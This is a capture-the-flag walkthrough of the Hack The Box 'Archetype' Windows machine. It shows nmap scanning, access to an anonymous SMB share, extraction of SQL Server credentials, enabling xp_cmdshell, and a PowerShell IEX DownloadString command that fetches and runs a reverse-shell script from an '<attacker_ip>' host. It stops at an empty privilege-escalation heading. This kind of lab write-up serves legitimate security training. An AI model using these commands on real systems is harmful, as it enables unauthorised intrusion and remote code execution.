# Archetype
AUTHOR: egre55
## Discription
Difficulty: Very Easy

OS: Windows
## Walkthrough
### 1. Enumeration
First, take some scanning on host:
```bash
$ nmap -sC -sV 10.10.10.27
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-12 10:44 +07
Nmap scan report for 10.10.10.27
Host is up (1.3s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1234/tcp open  hotline?
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info:
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-09-12T02:39:54
|_Not valid after:  2051-09-12T02:39:54
|_ssl-date: 2021-09-12T04:10:04+00:00; +24m51s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows                                                
Host script results:
|_clock-skew: mean: 1h48m51s, deviation: 3h07m51s, median: 24m50s
| ms-sql-info: 
|   10.10.10.27:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-09-11T21:09:44-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-12T04:09:45
|_  start_date: N/A
```
As we can see, there are 5 open ports 135, 139, 445, 1234, 1433 and we also got some additional information such as domain, OS, Server version,...

Do a bit research about these ports and I found that:
- 135: MS-RPC endpoint mapper
- 139: NetBIOS Session Service
- 445: SMB protocol *(further reading: [NetBIOS and SMB Penetration Testing on Windows](https://www.hackingarticles.in/netbios-and-smb-penetration-testing-on-windows/))*
- 1234: I still have no idea what is this port used for :v *([TCP 1234 - Port Protocol Information and Warning!](https://www.auditmypc.com/tcp-port-1234.asp))*
- 1433: MS-SQL Server

Basically, port 135 is used for sending messages between client-client and client-server. Port 139 is used for managing NetBIOS session. At simple approach, we focus on port 445 and 1433.

Now I try listing shares available on a host with `smbclient` and found a share file called `prod.dtsConfig` in folder `backups`.
```bash
$ smbclient -N -L \\\\10.10.10.27\\

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available

$ smbclient -N \\\\10.10.10.27\\backups
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 20 19:20:57 2020
  ..                                  D        0  Mon Jan 20 19:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 19:23:02 2020

                10328063 blocks of size 4096. 8260225 blocks available
smb: \> get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> exit
```
Let's take a look at the downloaded file, it's an XML configuration file for SQL Server.
> Read more: [DTSCONFIG File Extension](https://fileinfo.com/extension/dtsconfig)
```bash
$ cat prod.dtsConfig 
<DTSConfiguration>
	<DTSConfigurationHeading>
		<DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
	</DTSConfigurationHeading>
	<Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
		<ConfiguredValue>Data Source=.;Password=***********;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
	</Configuration>
</DTSConfiguration>
```
As we see, the file contains a user credential: `sql_svc:<password>`.
> I won't share any credential or flag to not ruin your experience :v
### 2. Foothold
With the credential we just have got from previous step, try to access to SQL Server on port 1433 with `mssqlclient.py` or any tool that you're familiar with.
```bash
$ mssqlclient.py -p 1433 ARCHETYPE/sql_svc:<password>@10.10.10.27 -windows-auth
Impacket v0.9.24.dev1+20210726.180101.1636eaab - Copyright 2021 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL>
```
First thing to do is to check if the user has system admin privilege.
```bash
SQL> select is_srvrolemember ('sysadmin');

-----------
          1		==> User has system admin privilege!

SQL>
```
So, user has system admin privilege, next thing we want to do is to enable xp_cmdshell, which allow us to execute command lines on target.
```bash
SQL> enable_xp_cmdshell
SQL> reconfigure;
SQL> xp_cmdshell "whoami"
archetype\sql_svc

SQL>
```
For a more convenient and stable connection, we will set up a reverse shell on target machine. There are many shell script that available on the Internet, find yourself one and save it as `shell.ps1`. I took it from this site: [Shells - Windows](https://book.hacktricks.xyz/shells/shells/windows).

If you've never heard of 'reverse shell', this would be helpful: [Understanding Reverse Shells](https://www.netsparker.com/blog/web-security/understanding-reverse-shells/).
> What is .ps1 extention?
> 
> - [PS1 File Extension](https://fileinfo.com/extension/ps1)
> 
> - [Differences between commands run in .bat file and powershell.exe](https://stackoverflow.com/questions/48215483/differences-between-commands-run-in-bat-file-and-powershell-exe)

Open http server for SQL Server to get the script
```bash
$ python3 -m http.server 8080
```

Open listening port for catching reverse shell
```bash
$ nc -lnvp <port>
```

Execute reverse shell from SQL Server
```bash
SQL> xp_cmdshell "powershell "IEX(New-Object Net.WebClient).DownloadString('http://<attacker_ip>:8080/path_to_shell.ps1')""
```

### 3. Privilege Escalation
